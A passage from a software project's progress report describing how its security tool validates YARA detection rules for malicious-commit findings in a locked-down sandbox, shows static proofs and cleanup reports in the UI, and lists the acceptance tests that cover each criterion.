  - `broker.py` packs archives through `ARCHIVES`: for `detection_rule`, `changed/`, `parent/` and `baseline/` each travel as their own gzip archive and `rule.yar` as a plain input, the file and byte bounds apply per archive and 256 MiB in all. Backend defaults are 600 s, 1024 MB, 1 CPU, 64 pids, 8 MiB output and 256 MiB input. `Workflows.execute` skips the source-generation check for this kind, and `worker.LONG_KINDS` includes it.
  - `POST /findings/{id}/artifact-generations` refuses a Malicious change Finding with 409 `generation_not_available`. The `analyze` helper in `backend/tests/test_analysis.py` leaves `detection_rule` jobs queued, so tests that analyse more than once keep claiming their own Analysis.
- **T4, the Finding page.**
  - A Malicious change Finding shows a Static Proof panel (the validation badge Validated, Failed or Not validated yet with a link to its job; each check with its label, status, message and matched files; the Detection rule in a `<pre>` with a copy button; the indicators with each file's sha256; the rejected values with their reasons) and a Cleanup report panel (the files and indicators the change added; the commits that contained it, linked when stored, with "and more" when truncated; the releases, or Unknown; the secrets to rotate; the Detection rule to run on the server with its validation state). Both render as escaped React text, with no `dangerouslySetInnerHTML` (A15).
  - For `malicious_change` the page leaves out the Lab panel, Start Lab (so the Approval dialog cannot open), the lab badge and Generate. The Draft callout reads "Missing: …. The static Proof is complete once its Detection rule validates." and keeps Upload, whose dialog offers "Detection rule (detection-rule.yar)" in place of the PoC and vulnerable-app fields.
  - `types.ts` adds `detectionChecks`, `staticProofSchema`, `cleanupReportSchema` and the Finding fields; `jobSummary.ts` reads a `detection_rule` job as "Detection rule validated", "Detection rule failed: <first failed check>" or "Validated an earlier revision".
- **T5, docs and this sweep.**
  - `docs/implementation-contract.md` already carried the Analysis output, the validation, the Finding fields and the refusal from T1–T3; this task added a verified-adjustment bullet with the phase's deviations. README step 7 now covers the static Proof, its validation, the cleanup report, no Lab or Generate, and re-drafting by repeat Analysis or upload; a validated Detection rule joins the reproduced Lab Proof as what confirms a Finding; the runtime section describes the yara job. Step 5 had been updated in T2.

Acceptance tests, all passing in the runs below:

| Criterion | Tests |
|---|---|
| AC-A07: no job ever executes a Malicious change payload | runtime `test_detection_rule_validation_never_executes_the_payload` (the postinstall fixture on the real Engine: the rule matches exactly the changed `package.json`, nothing in the parent or Baseline; no outputs, so the payload's `payload-ran` marker never appears, and the same payload run by `sh` in the probe image does write it; `network_mode none`, not privileged, only `/workspace/inputs` mounted read-only, no environment beyond `HOME` and `PATH`); runner `test_a_detection_rule_request_carries_no_credential_and_only_lowers_its_ceiling`; backend `test_a_malicious_postinstall_commit_ends_validated_with_a_cleanup_report_and_a_confirmed_finding` (the only runs are the read-only agent and `detection_rule`, with no profile, limits, policy or prompt), `test_generation_is_refused_for_a_malicious_change_finding`, Phase 4's `test_a_malicious_change_never_gets_a_lab`; UI `Findings` "offers no Lab and no generation for a Malicious change Finding" |
| AC-A07: a Detection rule that fails validation leaves the artifacts Draft, shows which check failed, and keeps the lifecycle state | backend `test_a_failing_check_leaves_draft_names_the_check_and_keeps_the_state[rule]`, `[changed]`, `[parent]`, `[baseline]` (Draft with the check's message among the limitations, status and cause unchanged, no transition event; a Confirmed Finding whose re-drafted rule then fails stays Confirmed), `test_a_detection_rule_that_cannot_be_read_fails_its_rule_check`, `test_malicious_change_publishes_its_static_proof_and_cleanup_report_to_the_finding` (no rule drafted: the `rule` check fails, Open kept); runner `test_detection_rule_workload_reports_a_rule_that_does_not_compile` (including `include` and the `console` module), `test_a_detection_rule_scan_error_fails_the_run`; runtime `test_detection_rule_reports_parent_matches_and_scans_only_the_trees_sent`; UI `Findings` "names the failed Detection rule check and keeps the artifacts Draft", `Jobs` "summarises a detection_rule job by its result" |
| A07 Commit validation: at least one changed file, no parent file, no Baseline file after the Baseline | backend `test_a_malicious_postinstall_commit_ends_validated_with_a_cleanup_report_and_a_confirmed_finding` (the four checks passed with their files and counts), the four failing-check cases above, `test_a_missing_tree_is_fetched_through_the_read_only_github_path`, `test_a_detection_rule_run_sends_each_tree_as_its_own_archive`, `test_a_malformed_validation_result_is_refused`; runner `test_detection_rule_workload_reports_matches_per_tree`; the two runtime tests above |
| A07 Commit validation: a Backfill commit is checked against its parent tree only | backend `test_a_backfill_commit_is_checked_against_its_parent_tree_only` (no `baseline/` sent although the Baseline holds the loader; the `baseline` check is skipped with its reason; validated and Confirmed); runtime `test_detection_rule_reports_parent_matches_and_scans_only_the_trees_sent` (a run without `baseline/` has no `baseline` entry) |
| A07 cleanup report: the files and indicators the change added, the commits and releases that contained it, the secrets to rotate, the Detection rule to run; never sent | backend `test_the_cleanup_report_keeps_only_changed_files_and_strings_from_the_added_lines`, `test_the_cleanup_report_lists_the_commits_and_releases_that_contained_the_change`, `test_the_cleanup_report_keeps_the_secrets_to_rotate_and_no_alert_carries_it`; integration `test_postgres_cleanup_report_orders_the_containing_commits_by_json_path`; UI `Findings` "shows the static Proof with each validation check and the cleanup report as text" |
| A11: a validated Detection rule confirms the Finding with cause `detection_rule` | backend `test_a_malicious_postinstall_commit_ends_validated_with_a_cleanup_report_and_a_confirmed_finding`, `test_uploading_a_corrected_rule_validates_the_new_revision` |
| A06, Malicious change row, Own column: static Proof, Detection rule and cleanup report (the revert Remediation PR is Phase 6) | backend `test_a_malicious_postinstall_commit_ends_validated_with_a_cleanup_report_and_a_confirmed_finding` (an Own repository) |
| A06, Malicious change row, Upstream column: static Proof, Detection rule and cleanup report (the pinning Remediation PR is Phase 6, the served-content sweep Phase 9) | backend `test_an_upstream_malicious_change_gets_a_static_proof_and_cleanup_report_in_each_application` (one shared Upstream commit: a static Proof revision, a validation job, a cleanup report and a Confirmed Finding in each of two Applications) |
| Plan Done-when: a fixture malicious `postinstall` commit ends with a validated Detection rule, a cleanup report and a Confirmed Finding, and no job ever executes the payload | two pieces on one fixture (the postinstall commit and rule, copied verbatim from `runner/tests/test_docker_runtime.py` into `backend/tests/test_detection_rules.py`): backend `test_a_malicious_postinstall_commit_ends_validated_with_a_cleanup_report_and_a_confirmed_finding` (Analysis, validation job and transition against `FixtureBroker`) and runtime `test_detection_rule_validation_never_executes_the_payload` (the same trees and rule on the real Engine) |

| Plan Done-when: a Backfill commit is checked against its parent tree only | the Backfill row above |

| Brief 2: Malicious change Analysis outputs, schema and prompt | backend `test_a_malicious_change_must_return_indicators_and_reachable_secrets`, `test_malicious_change_publishes_its_static_proof_and_cleanup_report_to_the_finding`, `test_the_detection_rule_section_describes_validation_and_the_cleanup_report` |
| Brief 3: validation against the changed files, parent and Baseline trees, trees from snapshots or the read-only fetch, the failed check recorded | the A07 Commit validation rows above |
